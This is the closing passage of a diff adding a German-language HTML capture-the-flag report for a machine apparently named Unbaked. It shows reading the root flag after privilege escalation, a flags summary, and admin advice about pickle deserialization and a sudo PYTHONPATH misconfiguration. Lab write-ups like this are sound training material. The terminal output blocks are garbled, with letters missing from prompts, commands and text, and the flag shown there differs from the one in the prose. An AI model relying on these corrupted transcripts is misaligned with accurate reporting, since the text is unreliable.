+                     <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Entfernen Sie die `SETENV` Option aus Sudo-Regeln für Skripte, die importierbare Module verwenden. Oder erlauben Sie nur eine strikt limitierte Whitelist von Umgebungsvariablen. Stellen Sie sicher, dass Skripte, die mit Sudo ausgeführt werden, sichere Importmethoden verwenden oder in einer isolierten Umgebung laufen. Überprüfen Sie Sudo-Regeln regelmäßig auf diese Art von Fehlkonfiguration.
+                 </p>
+            </section>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich die Root-Shell auf dem Host-System erlangt habe, navigiere ich in das Home-Verzeichnis des Root-Benutzers (`cd /root`) und liste den Inhalt auf (`ls`). Ich sehe die Datei `root.txt`. Ich lese den Inhalt dieser Datei mit `cat root.txt` aus. Die Ausgabe enthält eine Glückwunschnachricht, die Namen der Ersteller (`ch4rm & H0j3n`) und schließlich die Root-Flag: `Unb4ked_GOtcha!`.
+                <br><strong>Bewertung:</strong> Fantastisch! Die Root-Flag wurde erfolgreich erbeutet. Dies ist der abschließende Beweis für die vollständige Kompromittierung des Host-Systems bis zur höchsten Berechtigungsstufe. Beide Flags (User auf dem Host als ramsey und Root auf dem Host) wurden erfolgreich erbeutet.
+                <br><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass du sowohl die User- als auch die Root-Flag (oder andere definierte Ziele) erfasst und dokumentierst. Diese sind der primäre Nachweis für die Effektivität deines Penetrationstests.
+                <br><strong>Empfehlung (Admin):</strong> Die Root-Flag-Datei sollte in einem extrem geschützten Bereich liegen und nur für Root lesbar sein. Die Hauptproblematik, die zum Zugriff auf diese Datei führte, waren die ausgenutzten Schwachstellen (Pickle Deserialization, Sudo+PYTHONPATH Fehlkonfiguration). Konzentrieren Sie sich auf deren Behebung.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@unake:/tm# <span class="command">c /rt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@unake:/rt# <span class="command">ls</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">rt.txt  si</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@unake:/rt# <span class="command">cat rt.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">CNGRATS N WG THIS X!</span>
+<span class="command">Create y ch4rm & H0j3n</span>
+<span class="command">s: nt e a us, we he yu learn sethig new</span>
+
+<span class="password">flag: Unaked_Gtcha!</span>
+</pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/ramsey/user.txt</div>
+                    <div class="flag-value"><span class="password">Unb4ked_W00tw00t</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">Unb4ked_GOtcha!</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben  - Cyber Security Reports</p>
+        <p>Berichtsdatum: 16. Juni 2025</p>
+    </footer>
+
+  
+
+</body>
+</html>
